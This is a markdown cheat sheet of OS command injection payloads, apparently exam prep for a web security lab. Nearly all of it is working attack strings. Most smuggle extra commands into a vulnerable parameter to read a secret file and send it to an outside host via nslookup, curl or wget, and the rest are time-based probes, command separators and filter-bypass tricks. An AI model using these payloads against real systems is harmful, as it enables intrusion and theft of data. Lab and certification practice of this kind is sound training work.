# OS Command Injection Payloads

## DNS Exfiltration (RECOMMENDED)

### Read File via DNS
```bash
||nslookup $(cat /home/carlos/secret).burp.oastify.com||
||nslookup `cat /home/carlos/secret`.burp.oastify.com||
```

### Alternative Syntax
```bash
;nslookup $(cat /home/carlos/secret).burp.oastify.com;
|nslookup $(cat /home/carlos/secret).burp.oastify.com|
&nslookup $(cat /home/carlos/secret).burp.oastify.com&
```

## HTTP Exfiltration

### Using curl
```bash
||curl burp.oastify.com?c=$(cat /home/carlos/secret)||
||curl burp.oastify.com --data "$(cat /home/carlos/secret)"||
```

### Using wget
```bash
||wget --post-data=$(cat /home/carlos/secret) burp.oastify.com||
```

## Detection Payloads

### Time-Based
```bash
||sleep 10||
||ping -c 10 127.0.0.1||
```

### Out-of-Band
```bash
||nslookup burp.oastify.com||
||curl burp.oastify.com||
```

## Command Separators

```bash
;    # Semicolon
|    # Pipe
||   # OR
&    # Background
&&   # AND
%0a  # Newline
%0d  # Carriage return
`    # Backticks
$()  # Command substitution
```

## Bypass Techniques

### Space Bypass
```bash
cat${IFS}/home/carlos/secret
cat%09/home/carlos/secret
cat$IFS$9/home/carlos/secret
```

### Keyword Filtering
```bash
c''at /home/carlos/secret
c\at /home/carlos/secret
```

## Quick Reference

**Always use DNS exfiltration on exam!**
```bash
||nslookup $(cat /home/carlos/secret).burp.oastify.com||
```
